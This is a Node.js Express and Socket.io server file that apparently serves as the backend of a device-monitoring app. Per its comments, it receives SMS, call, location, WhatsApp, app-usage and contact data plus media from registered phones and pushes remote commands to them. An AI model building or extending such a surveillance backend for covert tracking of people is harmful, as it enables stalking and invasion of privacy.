require('dotenv').config();
const express = require('express');
const http = require('http');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const jwt = require('jsonwebtoken');
const { Server } = require('socket.io');

const authRoutes = require('./routes/auth');                // auth endpoints: /api/auth/...
const deviceRoutes = require('./routes/auth-device');      // device register endpoint (routes/auth-device.js)
const dataRoutes = require('./routes/data');               // data endpoints: /api/data/...
const mediaRoutes = require('./routes/media');             // media endpoints: /api/media/...
const commandsRoutes = require('./routes/commands');       // commands endpoints: /api/commands/...

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '30mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const JWT_SECRET = process.env.JWT_SECRET;
if (!MONGO_URI || !JWT_SECRET) {
  console.error("Please set MONGO_URI and JWT_SECRET in environment (.env).");
  process.exit(1);
}

// connect to mongo and create GridFS bucket
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log("MongoDB connected");
    const db = mongoose.connection.db;
    const GridFSBucket = mongoose.mongo.GridFSBucket;
    app.locals.gfsBucket = new GridFSBucket(db, { bucketName: 'mediaFiles' });
    console.log("GridFS bucket 'mediaFiles' initialized");
  })
  .catch(err => {
    console.error("MongoDB connect error:", err);
    process.exit(1);
  });

// serve frontend static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// -- API routes (mounts made explicit to avoid overlaps) --
// auth (login/register)
app.use('/api/auth', authRoutes);

// device registration / association
// expected routes in ./routes/auth-device.js (router.post('/register', authMiddleware, ...))
app.use('/api/auth/device', deviceRoutes);

// data endpoints (sms, call, location, whatsapp, app-usage, contacts, etc.)
app.use('/api/data', dataRoutes);

// media upload / download
app.use('/api/media', mediaRoutes);

// commands (poll / ack / push)
app.use('/api/commands', commandsRoutes);

// health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// fallback: only for non-API routes, serve index.html (for SPA)
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api/')) return next(); // let unknown API routes return 404 as normal
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// start http + socket.io
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET","POST"] }
});

// socket auth using token in query or headers
io.use((socket, next) => {
  // token may be sent as query parameter ?token=... or in auth header 'x-token'
  const token = (socket.handshake.query && socket.handshake.query.token) ||
                socket.handshake.headers['x-token'] ||
                socket.handshake.auth && socket.handshake.auth.token;

  if (!token) {
    console.warn('socket auth: missing token');
    return next(new Error('auth error'));
  }

  try {
    const payload = jwt.verify(token, JWT_SECRET);
    const userId = payload.sub || payload.id || payload.userId;
    const username = payload.username || payload.user || payload.name || 'unknown';
    if (!userId) {
      console.warn('socket auth: token payload missing user id');
      return next(new Error('auth error'));
    }
    socket.user = { id: userId, username };
    return next();
  } catch (e) {
    console.warn('socket auth verify failed:', e && e.message);
    return next(new Error('auth error'));
  }
});

io.on('connection', (socket) => {
  const userId = socket.user.id;
  const room = `user:${userId}`;
  socket.join(room);
  console.log('socket connected user', socket.user.username, 'room', room);

  socket.on('disconnect', (reason) => {
    console.log('socket disconnected', socket.user && socket.user.username, 'reason:', reason);
  });
});

// expose io to routes via app.locals
app.locals.io = io;

// global error handlers
process.on('uncaughtException', (err) => {
  console.error('uncaughtException', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('unhandledRejection', reason);
});

server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
